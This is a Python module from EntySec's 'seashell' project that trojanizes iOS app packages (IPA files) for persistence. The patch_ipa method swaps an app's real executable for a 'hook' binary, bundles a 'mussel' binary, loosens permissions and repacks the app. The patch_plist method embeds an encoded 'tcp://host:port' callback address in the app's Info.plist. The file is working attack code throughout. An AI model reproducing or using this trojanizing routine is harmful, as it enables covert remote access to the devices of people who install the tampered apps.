"""
MIT License

Copyright (c) 2020-2024 EntySec

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

import os
import shutil
import plistlib

from typing import Optional

from alive_progress import alive_bar
from pex.string import String

from seashell.lib.config import Config


class Hook(Config):
    """ Subclass of seashell.core module.

    This subclass of seashell.core module is intended for providing
    an implementation a persistence for a poor man.
    """

    def __init__(self, host: Optional[str] = None,
                 port: Optional[int] = None) -> None:
        """ Initialize device hook.

        :param Optional[str] host: host
        :param Optional[int] port: port
        :return None: None
        """

        if host and port:
            self.hash = String().base64_string(
                f'tcp://{host}:{str(port)}', decode=True)
        else:
            self.hash = ''

        self.main = self.data_path + 'hook'
        self.mussel = self.data_path + 'Mussel.app/mussel'

    def patch_ipa(self, path: str) -> None:
        """ Patch existing IPA.

        :param str path: path to IPA file
        :return None: None
        """

        with alive_bar(monitor=False, stats=False, ctrl_c=False, receipt=False,
                       title="Patching {}".format(path)) as _:
            shutil.unpack_archive(path, format='zip')
            app_files = [file for file in os.listdir('Payload') if file.endswith('.app')]

            if not app_files:
                return

            bundle = '/'.join(('Payload', app_files[0] + '/'))
            executable = self.get_executable(bundle + 'Info.plist')

            self.patch_plist(bundle + 'Info.plist')

            shutil.move(bundle + executable, bundle + executable + '.hooked')
            shutil.copy(self.main, bundle + executable)
            shutil.copy(self.mussel, bundle + 'mussel')

            os.chmod(bundle + executable, 777)
            os.chmod(bundle + 'mussel', 777)

            app = path[:-4]
            os.remove(path)

            os.mkdir(app)
            shutil.move('Payload', app)
            shutil.make_archive(path, 'zip', app)
            shutil.move(path + '.zip', path)
            shutil.rmtree(app)

    @staticmethod
    def get_executable(path: str) -> str:
        """ Get CFBundleExecutable path from plist.

        :param str path: path to plist to parse
        :return str: content of CFBundleExecutable
        """

        with open(path, 'rb') as f:
            plist_data = plistlib.load(f)

        if 'CFBundleExecutable' in plist_data:
            return plist_data['CFBundleExecutable']

        return ''

    def patch_plist(self, path: str, revert: bool = False) -> None:
        """ Patch plist file and insert object.

        :param str path: path to plist to patch
        :param bool revert: revert
        :return None: None
        """

        with open(path, 'rb') as f:
            plist_data = plistlib.load(f)

        if not revert:
            plist_data['CFBundleSignature'] = self.hash
        else:
            plist_data['CFBundleSignature'] = '????'

        with open(path, 'wb') as f:
            plistlib.dump(plist_data, f)
